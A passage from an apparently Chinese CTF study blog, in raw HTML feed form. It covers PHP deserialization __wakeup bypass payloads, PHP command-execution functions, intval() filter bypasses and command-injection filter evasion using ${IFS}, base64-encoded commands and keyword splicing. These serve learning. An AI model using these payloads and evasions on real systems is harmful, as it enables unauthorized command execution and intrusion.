class="hljs-title function_ invoke__">show_source</span>(<span class="hljs-string">&quot;class.php&quot;</span>);<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">HaHaHa</span></span>&#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$admin</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$passwd</span>;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;admin =<span class="hljs-string">&quot;user&quot;</span>;<br>            <span class="hljs-variable language_">$this</span>-&gt;passwd = <span class="hljs-string">&quot;123456&quot;</span>;<br>        &#125;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;passwd = <span class="hljs-title function_ invoke__">sha1</span>(<span class="hljs-variable">$this</span>-&gt;passwd);<br>        &#125;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>            <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;admin === <span class="hljs-string">&quot;admin&quot;</span> &amp;&amp; <span class="hljs-variable language_">$this</span>-&gt;passwd === <span class="hljs-string">&quot;wllm&quot;</span>)&#123;<br>                <span class="hljs-keyword">include</span>(<span class="hljs-string">&quot;flag.php&quot;</span>);<br>                <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>            &#125;<span class="hljs-keyword">else</span>&#123;<br>                <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;passwd;<br>                <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;No wake up&quot;</span>;<br>            &#125;<br>        &#125;<br>    &#125;<br><span class="hljs-variable">$Letmeseesee</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;p&#x27;</span>];<br><span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$Letmeseesee</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>在29行程序调用反序列化方法时，会自动执行__weakup()函数，而显然weakup方法会加密上传的序列化参数中的passwd，而sha1是不可逆加密算法，目前也没有合适的sha1碰撞的方式，故考虑到绕过__weakup()函数；</p><p>php的特性，当序列化后对象的参数列表中成员个数和实际个数不符合时会绕过 __weakup(); 因而先构造</p><p>O:6:”HaHaHa”:2:{s:5:”admin”;s:5:”admin”;s:6:”passwd”;s:4:”wllm”;}</p><p>改成</p><p>O:6:”HaHaHa”:3:{s:5:”admin”;s:5:”admin”;s:6:”passwd”;s:4:”wllm”;}</p><h1 id="例题ez-unserialize"><a href="#例题ez-unserialize" class="headerlink" title="例题ez_unserialize"></a>例题ez_unserialize</h1><p>打开网页没看到题目，用御剑后台扫描一下</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/42988179/1722065613801-b19ed9b9-2ca0-44aa-89f3-7f31799cff0f.png"></p><p>看到一个robots.txt</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/42988179/1722066735633-34ed1da9-4f06-44a2-9496-e8ba7364c2b0.png"></p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/42988179/1722066811949-9a948cd9-93dd-41bc-ab7c-60107fb041fd.png"></p><h2 id="关于robots-txt，"><a href="#关于robots-txt，" class="headerlink" title="关于robots.txt，"></a>关于robots.txt，</h2><p>robots协议也称爬虫协议、爬虫规则等,是指网站可建立一个robots.txt文件来告诉搜索引擎哪些页面可以抓取,哪些页面不能抓取,而搜索引擎则通过读取robots.txt文件来识别这个页面是否允许被抓取。 <strong>但是,这个robots协议不是防火墙,也没有强制执行力,搜索引擎完全可以忽视robots.txt文件去抓取网页的快照。</strong> 如果想单独定义搜索引擎的漫游器访问子目录时的行为，那么可以将自定的设置合并到根目录下的robots.txt，或者使用robots元数据（Metadata，又称元数据）。</p><p>从robots文件中得知存在&#x2F;cl45s.php，遂进入该目录下打开该文件，获得代码</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/42988179/1722066854253-9822a7ce-2355-4c34-adc8-f36b226b4339.png"></p><p>?p&#x3D;O:4:”wllm”:2:{s:5:”admin”;s:5:”admin”;s:6:”passwd”;s:3:”ctf”;}</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/42988179/1722067134291-bc250ed1-83b6-4111-b167-8b010a840541.png"></p>]]></content>
    
    
    
    <tags>
      
      <tag>WEB</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>php反序列化漏洞</title>
    <link href="/2025/03/22/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    <url>/2025/03/22/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
    
    <content type="html"><![CDATA[<h1 id="PHP常见的命令执行函数与代码执行函数"><a href="#PHP常见的命令执行函数与代码执行函数" class="headerlink" title="PHP常见的命令执行函数与代码执行函数"></a>PHP常见的命令执行函数与代码执行函数</h1><h1 id="PHP执行系统外部命令函数-exec-、passthru-、system-、shell-exec"><a href="#PHP执行系统外部命令函数-exec-、passthru-、system-、shell-exec" class="headerlink" title="PHP执行系统外部命令函数:exec()、passthru()、system()、shell_exec()"></a><a href="https://www.cnblogs.com/gaohj/p/3267692.html">PHP执行系统外部命令函数:exec()、passthru()、system()、shell_exec()</a></h1><p>php提供4种方法执行系统外部命令：exec()、passthru()、system()、 shell_exec()。<br>在开始介绍前，先检查下php配置文件php.ini中是有禁止这是个函数。找到 disable_functions，配置如下：</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf">disable_functions <span class="hljs-operator">=</span><br></code></pre></td></tr></table></figure><p>如果“disable_functions&#x3D;”后面有接上面四个函数，将其删除。<br>默认php.ini配置文件中是不禁止你调用执行外部命令的函数的。</p><h2 id="方法一：exec"><a href="#方法一：exec" class="headerlink" title="方法一：exec()"></a>方法一：exec()</h2><p>function exec(string $command,array[optional] $output,int[optional] $return_value)</p><p>php代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>        <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">exec</span>(<span class="hljs-string">&quot;ls&quot;</span>,<span class="hljs-variable">$file</span>);<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;/br&gt;&quot;</span>;<br>        <span class="hljs-title function_ invoke__">print_r</span>(<span class="hljs-variable">$file</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>执行结果：</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs stylus">test<span class="hljs-selector-class">.php</span><br><span class="hljs-function"><span class="hljs-title">Array</span><span class="hljs-params">( [<span class="hljs-number">0</span>] =&gt; index.php [<span class="hljs-number">1</span>] =&gt; test.php)</span></span><br></code></pre></td></tr></table></figure><p>知识点：<br>exec 执行系统外部命令时不会输出结果，而是返回结果的最后一行，如果你想得到结果你可以使用第二个参数，让其输出到指定的数组，此数组一个记录代表输出的一行，即如果输出结果有20行，则这个数组就有20条记录，所以如果你需要反复输出调用不同系统外部命令的结果，你最好在输出每一条系统外部命令结果时清空这个数组，以防混乱。第三个参数用来取得命令执行的状态码，通常执行成功都是返回０。</p><h2 id="方法二：passthru"><a href="#方法二：passthru" class="headerlink" title="方法二：passthru()"></a>方法二：passthru()</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">passthru</span>(<span class="hljs-params"><span class="hljs-keyword">string</span> <span class="hljs-variable">$command</span>,<span class="hljs-keyword">int</span>[optional] <span class="hljs-variable">$return_value</span></span>)</span><br></code></pre></td></tr></table></figure><p>代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>        <span class="hljs-title function_ invoke__">passthru</span>(<span class="hljs-string">&quot;ls&quot;</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>执行结果：</p><figure class="highlight axapta"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs axapta"><span class="hljs-keyword">index</span>.phptest.php<br></code></pre></td></tr></table></figure><p>知识点：<br>passthru与system的区别，passthru直接将结果输出到浏览器，不需要使用 echo 或 return 来查看结果，不返回任何值，且其可以输出二进制，比如图像数据。</p><h2 id="方法三：system"><a href="#方法三：system" class="headerlink" title="方法三：system()"></a>方法三：system()</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">system</span>(<span class="hljs-params"><span class="hljs-keyword">string</span> <span class="hljs-variable">$command</span>,<span class="hljs-keyword">int</span>[optional] <span class="hljs-variable">$return_value</span></span>)</span><br></code></pre></td></tr></table></figure><p>代码：</p><table><thead><tr><th></th></tr></thead><tbody><tr><td><code>&lt;br&gt;&lt;?php&lt;br&gt;        system(&quot;ls /&quot;);&lt;br&gt;?&gt;&lt;br&gt;</code></td></tr></tbody></table><p>执行结果：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">binbootcgroupdevetchomeliblost+foundmediamntoptprocrootsbinselinuxsrvsystmpusrvar<br></code></pre></td></tr></table></figure><p>知识点：<br>system和exec的区别在于system在执行系统外部命令时，直接将结果输出到浏览器，不需要使用 echo 或 return 来查看结果，如果执行命令成功则返回true，否则返回false。第二个参数与exec第三个参数含义一样。</p><h2 id="方法四：反撇号-和shell-exec"><a href="#方法四：反撇号-和shell-exec" class="headerlink" title="方法四：反撇号&#96;和shell_exec()"></a>方法四：反撇号&#96;和shell_exec()</h2><p>shell_exec() 函数实际上仅是反撇号 (&#96;) 操作符的变体<br>代码：</p><table><thead><tr><th></th></tr></thead><tbody><tr><td><code>&lt;br&gt;&lt;?php&lt;br&gt;        echo `pwd`;&lt;br&gt;?&gt;&lt;br&gt;</code></td></tr></tbody></table><p>执行结果：</p><p>&#x2F;var&#x2F;www&#x2F;html</p><h1 id="1-eval（）和include的区别"><a href="#1-eval（）和include的区别" class="headerlink" title="1. eval（）和include的区别"></a>1. eval（）和include的区别</h1><p>都不是函数，都是语言结构 无法通过配置文件的禁用来禁用</p><p>eval 要执行的php代码</p><p>include 参数是一个路径，表示执行php文件的路径，读取路径中文件的内容，然后执行里面的php代码</p><p>include “common.php”</p><p>include “phpinfo();”;错误❌</p><h1 id="2-intval-函数详解，intval-函数漏洞原理及绕过思路"><a href="#2-intval-函数详解，intval-函数漏洞原理及绕过思路" class="headerlink" title="2. intval()函数详解，intval()函数漏洞原理及绕过思路"></a>2. intval()函数详解，intval()函数漏洞原理及绕过思路</h1><p>intval() 函数可以获取变量的「整数值」。常用于<a href="https://so.csdn.net/so/search?q=%E5%BC%BA%E5%88%B6%E7%B1%BB%E5%9E%8B%E8%BD%AC%E6%8D%A2&spm=1001.2101.3001.7020">强制类型转换</a></p><p>语法</p><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs autoit"><span class="hljs-built_in">int</span> intval( $var, $base )<br></code></pre></td></tr></table></figure><p>参数</p><ul><li>$var：需要转换成 integer 的「变量」</li><li>$base：转换所使用的「进制」</li></ul><p>返回值</p><p>返回值为 integer 类型，可能是 0 或 1 或 其他integer 值。</p><ul><li>0：失败 或 空array 返回 0</li><li>1：非空array 返回 1</li><li>其他integer值：成功时 返回 $var 的 integer 值。</li><li>返回值的「最大值」取决于系统</li><li>32 位系统（-2147483648 到 2147483647）</li><li>64 位系统（-9223372036854775808到9223372036854775807）</li></ul><h3 id="2-1-1-进制自动转换"><a href="#2-1-1-进制自动转换" class="headerlink" title="2.1.1. 进制自动转换"></a>2.1.1. 进制自动转换</h3><p>第二个参数 $base 允许为空。</p><p>当 base 为空时，默认值是 0，会根据 $var 的格式来调整转换的进制。</p><ul><li>如果 $var 以 0 开头，就使用 8进制</li><li>如果 $var 以0x开头，就使用 16进制</li><li>否则，就使用 10进制</li></ul><p>例子</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-comment"># 10的 8进制是12</span><br><span class="hljs-attribute">var_dump</span>(intval(<span class="hljs-number">012</span>));<br><span class="hljs-comment"># 10的 16进制是A</span><br><span class="hljs-attribute">var_dump</span>(intval(<span class="hljs-number">0</span>xA));<br><span class="hljs-comment"># 10的 10进制是10</span><br><span class="hljs-attribute">var_dump</span>(intval(<span class="hljs-number">10</span>));<br></code></pre></td></tr></table></figure><p>输出</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">int</span><span class="hljs-params">(<span class="hljs-number">10</span>)</span></span><br><span class="hljs-function"><span class="hljs-title">int</span><span class="hljs-params">(<span class="hljs-number">10</span>)</span></span><br><span class="hljs-function"><span class="hljs-title">int</span><span class="hljs-params">(<span class="hljs-number">10</span>)</span></span><br></code></pre></td></tr></table></figure><p>绕过思路：当某个数字被过滤时，可以使用它的 8进制&#x2F;16进制来绕过。</p><h3 id="2-1-2-转换数组"><a href="#2-1-2-转换数组" class="headerlink" title="2.1.2. 转换数组"></a>2.1.2. 转换数组</h3><p>intval() 转换数组类型时，不关心数组中的内容，只判断数组中有没有元素。</p><ul><li>「空数组」返回 0</li><li>「非空数组」返回 1</li></ul><p><strong>实例：</strong></p><figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs lisp">var_dump(<span class="hljs-name">intval</span>(<span class="hljs-name">array</span>()))<span class="hljs-comment">;</span><br>var_dump(<span class="hljs-name">intval</span>(<span class="hljs-name">array</span>(<span class="hljs-number">3</span>,<span class="hljs-number">2</span>)))<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure><p>输出</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">int</span><span class="hljs-params">(<span class="hljs-number">0</span>)</span></span><br><span class="hljs-function"><span class="hljs-title">int</span><span class="hljs-params">(<span class="hljs-number">1</span>)</span></span><br></code></pre></td></tr></table></figure><p>如果传入的 $var是数组中的某个值时，则当做变量来转换，而不是当做数组类型。</p><p><strong>实例：</strong></p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs gams"><span class="hljs-meta"><span class="hljs-keyword">$arr1</span> = array(8,6);</span><br><br>var_dump(intval(<span class="hljs-symbol">$</span>arr1[<span class="hljs-number">0</span>]));<br></code></pre></td></tr></table></figure><p>输出</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">int</span><span class="hljs-params">(<span class="hljs-number">8</span>)</span></span><br></code></pre></td></tr></table></figure><p>绕过思路：对于弱比较（a&#x3D;&#x3D;b），可以给a、b两个参数传入空数组，使弱比较为true。</p><h3 id="2-1-3-转换小数"><a href="#2-1-3-转换小数" class="headerlink" title="2.1.3. 转换小数"></a>2.1.3. 转换小数</h3><p>intval() 转换小数类型时，只返回个位数，不遵循四舍五入的原则。</p><p>例子</p><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs isbl"><span class="hljs-function"><span class="hljs-title">var_dump</span>(<span class="hljs-title">intval</span>(<span class="hljs-number">12</span>));</span><br><span class="hljs-function"><span class="hljs-title">var_dump</span>(<span class="hljs-title">intval</span>(<span class="hljs-number">1.2</span>));</span><br><span class="hljs-function"><span class="hljs-title">var_dump</span>(<span class="hljs-title">intval</span>(<span class="hljs-number">1.9</span>));</span><br></code></pre></td></tr></table></figure><p>输出</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">int</span><span class="hljs-params">(<span class="hljs-number">12</span>)</span></span><br><span class="hljs-function"><span class="hljs-title">int</span><span class="hljs-params">(<span class="hljs-number">1</span>)</span></span><br><span class="hljs-function"><span class="hljs-title">int</span><span class="hljs-params">(<span class="hljs-number">1</span>)</span></span><br></code></pre></td></tr></table></figure><p>绕过思路：当某个数字被过滤时，可以给它增加小数位来绕过。</p><h3 id="2-1-4-转换字符串"><a href="#2-1-4-转换字符串" class="headerlink" title="2.1.4. 转换字符串"></a>2.1.4. 转换字符串</h3><p>intval() 转换字符串类型时，会判断字符串是否以数字开头</p><ul><li>如果以数字开头，就返回1个或多个连续的数字</li><li>如果以字母开头，就返回0</li></ul><p>单双引号对转换结果没有影响，并且 0 或 0x 开头也只会当做普通<a href="https://so.csdn.net/so/search?q=%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%A4%84%E7%90%86&spm=1001.2101.3001.7020">字符串处理</a>。</p><p>例子</p><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs isbl"><span class="hljs-function"><span class="hljs-title">var_dump</span>(<span class="hljs-title">intval</span>(<span class="hljs-string">&#x27;12abc&#x27;</span>));</span><br><span class="hljs-function"><span class="hljs-title">var_dump</span>(<span class="hljs-title">intval</span>(<span class="hljs-string">&quot;12abc&quot;</span>));</span><br><span class="hljs-function"><span class="hljs-title">var_dump</span>(<span class="hljs-title">intval</span>(<span class="hljs-string">&#x27;abc123&#x27;</span>));</span><br><span class="hljs-function"><span class="hljs-title">var_dump</span>(<span class="hljs-title">intval</span>(<span class="hljs-string">&#x27;1a2b3c&#x27;</span>));</span><br><span class="hljs-function"><span class="hljs-title">var_dump</span>(<span class="hljs-title">intval</span>(<span class="hljs-string">&#x27;0101&#x27;</span>));</span><br><span class="hljs-function"><span class="hljs-title">var_dump</span>(<span class="hljs-title">intval</span>(<span class="hljs-string">&quot;0x2b&quot;</span>));</span><br></code></pre></td></tr></table></figure><p>输出</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">int</span><span class="hljs-params">(<span class="hljs-number">12</span>)</span></span><br><span class="hljs-function"><span class="hljs-title">int</span><span class="hljs-params">(<span class="hljs-number">12</span>)</span></span><br><span class="hljs-function"><span class="hljs-title">int</span><span class="hljs-params">(<span class="hljs-number">0</span>)</span></span><br><span class="hljs-function"><span class="hljs-title">int</span><span class="hljs-params">(<span class="hljs-number">1</span>)</span></span><br><span class="hljs-function"><span class="hljs-title">int</span><span class="hljs-params">(<span class="hljs-number">101</span>)</span></span><br><span class="hljs-function"><span class="hljs-title">int</span><span class="hljs-params">(<span class="hljs-number">0</span>)</span></span><br></code></pre></td></tr></table></figure><h3 id="2-1-5-五取反"><a href="#2-1-5-五取反" class="headerlink" title="2.1.5. 五取反~"></a>2.1.5. 五取反~</h3><p>intval() 函数支持一些<a href="https://so.csdn.net/so/search?q=%E7%89%B9%E6%AE%8A%E7%AC%A6%E5%8F%B7&spm=1001.2101.3001.7020">特殊符号</a>的，比如~取反。</p><p><strong>实例：</strong></p><figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs lisp">var_dump(<span class="hljs-name">intval</span>(~<span class="hljs-number">10</span>))<span class="hljs-comment">;</span><br>var_dump(<span class="hljs-name">intval</span>(~~<span class="hljs-number">10</span>))<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure><p><strong>输出</strong></p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">int</span><span class="hljs-params">(-<span class="hljs-number">11</span>)</span></span><br><span class="hljs-function"><span class="hljs-title">int</span><span class="hljs-params">(<span class="hljs-number">10</span>)</span></span><br></code></pre></td></tr></table></figure><p>绕过思路：当某个数字被过滤时，可以两次取反来绕过。</p><h3 id="2-1-6-算数运算符"><a href="#2-1-6-算数运算符" class="headerlink" title="2.1.6. 算数运算符"></a>2.1.6. 算数运算符</h3><p>intval() 函数支持算数运算符，如果传入的 $var参数包含算数运算符，会先传入再运算，再对运算结果进行转换。</p><p><strong>实例：</strong></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">var_dump</span>(intval(<span class="hljs-number">5</span>*<span class="hljs-number">5</span>));<br><span class="hljs-attribute">var_dump</span>(intval(<span class="hljs-number">5</span>+<span class="hljs-number">5</span>));<br><span class="hljs-attribute">var_dump</span>(intval(<span class="hljs-number">05</span>+<span class="hljs-number">5</span>));<br></code></pre></td></tr></table></figure><p>输出</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">int</span><span class="hljs-params">(<span class="hljs-number">25</span>)</span></span><br><span class="hljs-function"><span class="hljs-title">int</span><span class="hljs-params">(<span class="hljs-number">10</span>)</span></span><br><span class="hljs-function"><span class="hljs-title">int</span><span class="hljs-params">(<span class="hljs-number">10</span>)</span></span><br></code></pre></td></tr></table></figure><p>绕过思路：当某个数字被过滤时，可以使用算数运算符绕过。</p><h3 id="2-1-7-浮点数精度缺失问题"><a href="#2-1-7-浮点数精度缺失问题" class="headerlink" title="2.1.7. 浮点数精度缺失问题"></a>2.1.7. 浮点数精度缺失问题</h3><p>由于PHP中的浮点数是「弱类型」，存在「精度丢失」的问题，在转换时可能会出现意料之外的情况。</p><p>比如下面这个案例，第一个输出34正常，第二个以为会输出58，结果输出了57。</p><p><strong>实例：</strong></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">var_dump</span>(intval(<span class="hljs-number">0</span>.<span class="hljs-number">34</span>*<span class="hljs-number">100</span>.<span class="hljs-number">0</span>));<br><span class="hljs-attribute">var_dump</span>(intval(<span class="hljs-number">0</span>.<span class="hljs-number">58</span>*<span class="hljs-number">100</span>.<span class="hljs-number">0</span>));<br></code></pre></td></tr></table></figure><p>输出</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">int</span><span class="hljs-params">(<span class="hljs-number">34</span>)</span></span><br><span class="hljs-function"><span class="hljs-title">int</span><span class="hljs-params">(<span class="hljs-number">57</span>)</span></span><br></code></pre></td></tr></table></figure><h3 id="2-1-8-intval-绕过思路"><a href="#2-1-8-intval-绕过思路" class="headerlink" title="2.1.8. intval()绕过思路"></a>2.1.8. intval()绕过思路</h3><p>最后汇总一下intval()函数漏洞的绕过思路：</p><p>1）当某个数字被过滤时，可以使用它的 8进制&#x2F;16进制来绕过；比如过滤10，就用012（八进制）或0xA（十六进制）。</p><p>2）对于弱比较（a&#x3D;&#x3D;b），可以给a、b两个参数传入空数组，使弱比较为true。</p><p>3）当某个数字被过滤时，可以给它增加小数位来绕过；比如过滤3，就用3.1。</p><p>4）当某个数字被过滤时，可以给它拼接字符串来绕过；比如过滤3，就用3ab。（GET请求的参数会自动拼接单引号）</p><p>5）当某个数字被过滤时，可以两次取反来绕过；比如过滤10，就用~~10。</p><p>6）当某个数字被过滤时，可以使用算数运算符绕过；比如过滤10，就用 5+5 或 2*5。</p><h1 id="3-绕过还可以用base编码"><a href="#3-绕过还可以用base编码" class="headerlink" title="3. 绕过还可以用base编码"></a>3. 绕过还可以用base编码</h1><p>tac flag.php</p><p>dGFjIGZsYWcucGhw</p><p>?cmd&#x3D;echo ‘dGFjIGZsYWcucGhw’|base64 -d ‘</p><h1 id="4-通配符-使用-绕过"><a href="#4-通配符-使用-绕过" class="headerlink" title="4. 通配符 使用 * ?绕过"></a>4. 通配符 使用 * ?绕过</h1><h1 id="5-关键词拼接法"><a href="#5-关键词拼接法" class="headerlink" title="5. 关键词拼接法"></a>5. 关键词拼接法</h1><p>a&#x3D;c;b&#x3D;at;c&#x3D;fla;d&#x3D;g.php&#x2F;&#x2F; cat flag.php</p><h1 id="6-符号过滤法"><a href="#6-符号过滤法" class="headerlink" title="6. 符号过滤法"></a>6. 符号过滤法</h1><p>空格 代替 %09 {$IF} &lt;&gt;</p><h1 id="7-环境变量字符串截取法-获取敏感字符"><a href="#7-环境变量字符串截取法-获取敏感字符" class="headerlink" title="7. 环境变量字符串截取法 获取敏感字符"></a>7. 环境变量字符串截取法 获取敏感字符</h1><h1 id="PHP反序列化漏洞详解"><a href="#PHP反序列化漏洞详解" class="headerlink" title="PHP反序列化漏洞详解"></a>PHP反序列化漏洞详解</h1><p>在面向对象的程序设计（Object-oriented programming，OOP）中，</p><p>对象是一个由信息及对信息进行处理的描述所组成的整体，是对现实世界的抽象。</p><p>类是一个共享相同结构和行为的对象的集合。每个类的定义都以关键字class开头，后面跟着类的名字。</p><p>创建一个PHP类：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">TestClass</span> //定义一个类</span><br><span class="hljs-class"></span>&#123;<br><span class="hljs-comment">//一个变量</span><br><span class="hljs-keyword">public</span> <span class="hljs-variable">$variable</span> = <span class="hljs-string">&#x27;This is a string&#x27;</span>;<br><span class="hljs-comment">//一个方法</span><br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">PrintVariable</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;variable;<br>&#125;<br>&#125;<br><span class="hljs-comment">//创建一个对象</span><br><span class="hljs-variable">$object</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">TestClass</span>();<br><span class="hljs-comment">//调用一个方法</span><br><span class="hljs-variable">$object</span>-&gt;<span class="hljs-title function_ invoke__">PrintVariable</span>();<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h1 id="linux下不用空格执行带参数的5种姿势-sevck-博客园-cnblogs-com"><a href="#linux下不用空格执行带参数的5种姿势-sevck-博客园-cnblogs-com" class="headerlink" title="linux下不用空格执行带参数的5种姿势 - sevck - 博客园 (cnblogs.com)"></a>linux下不用空格执行带参数的5种姿势 - sevck - 博客园 (cnblogs.com)</h1><p><a href="https://www.cnblogs.com/sevck/p/6072721.html">linux下不用空格执行带参数的5种姿势 - sevck - 博客园 (cnblogs.com)</a></p><figure class="highlight erlang"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs erlang"><span class="hljs-string">$&#123;</span>IFS&#125;<span class="hljs-string">$9</span><br>&#123;IFS&#125;<br><span class="hljs-string">$I</span>FS<br><span class="hljs-string">$&#123;</span>IFS&#125;<br><span class="hljs-string">$I</span>FS<span class="hljs-string">$1</span> //<span class="hljs-string">$1</span>改成<span class="hljs-string">$加</span>其他数字貌似都行<br>IFS<br>&lt; <br>&lt;&gt; <br>&#123;cat,flag.php&#125;  //用逗号实现了空格功能，需要用&#123;&#125;括起来<br><span class="hljs-comment">%20   (space)</span><br><span class="hljs-comment">%09   (tab)</span><br>X=<span class="hljs-string">$&#x27;</span>cat\x09./flag.php&#x27;;<span class="hljs-string">$X</span>  